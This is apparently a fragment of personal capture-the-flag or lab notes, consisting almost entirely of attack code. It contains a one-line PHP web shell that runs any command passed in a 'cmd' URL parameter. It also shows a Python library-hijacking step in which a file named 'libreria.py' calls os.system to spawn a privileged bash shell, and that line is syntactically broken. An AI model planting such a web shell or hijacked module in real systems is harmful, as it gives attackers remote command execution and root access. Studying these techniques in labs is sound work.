


<?php echo shell_exec($_GET['cmd']); ?>


`python3 -c "import sys; print(sys.path)"`

nano libreria.py

```python
import os

os.system(bash -p) 
```

![[Pasted image 20240408135004.png]]